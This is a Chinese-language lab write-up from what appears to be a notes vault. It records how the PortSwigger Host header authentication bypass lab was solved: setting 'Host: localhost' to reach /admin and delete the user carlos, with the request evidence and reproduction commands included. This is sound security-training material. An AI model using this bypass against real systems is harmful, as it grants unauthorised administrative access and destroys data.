---
title: "lab-host-header-authentication-bypass"
links:
  - target: host-header-family
    relation: evidences
---

# lab-host-header-authentication-bypass

> evidences: [[host-header-family]]

- 题面:Host header authentication bypass(/web-security/host-header/exploiting/lab-host-header-authentication-bypass)
- 实例:https://0ab700fd034a83d480f2670d006b0015.web-security-academy.net
- 判定目标:进入 admin 面板并删除 carlos

## 关键步

1. 侦察(`lab_page`):题面「按 HTTP Host 头假设用户权限」;目标删 carlos。
2. 基线:`GET /admin` → 401(鉴权按 Host 判定)。
3. 覆盖:`GET /admin` 加请求头 `Host: localhost` → 200,admin 面板出现 `carlos` 删除链接。
4. 收尾:`GET /admin/delete?username=carlos` 同带 `Host: localhost` → 302 回 `/admin`。

## 交册值

请求头 `Host: localhost` 覆盖即本地身份越权,直达 `/admin` 并删除 carlos。

## 证据摘录

```
GET /admin                               -> 401 Unauthorized
GET /admin   (Host: localhost)           -> 200,面板含 "/admin/delete?username=carlos"
GET /admin/delete?username=carlos (Host: localhost) -> 302 -> /admin
solved_check / -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass" --out /tmp/hh1-page.html
lab_launch launch <lab_id> --widget-source /web-security/host-header/exploiting/lab-host-header-authentication-bypass --jar /tmp/mar-jar.json
lab_http get "<inst>/admin" --header 'Host: localhost' --jar /tmp/mar-jar.json
lab_http get "<inst>/admin/delete?username=carlos" --header 'Host: localhost' --follow --jar /tmp/mar-jar.json
solved_check "<inst>/" --jar /tmp/mar-jar.json
```

注:题面经 `lab_page` 读取(已剥离 solution);每步以实例响应实证。
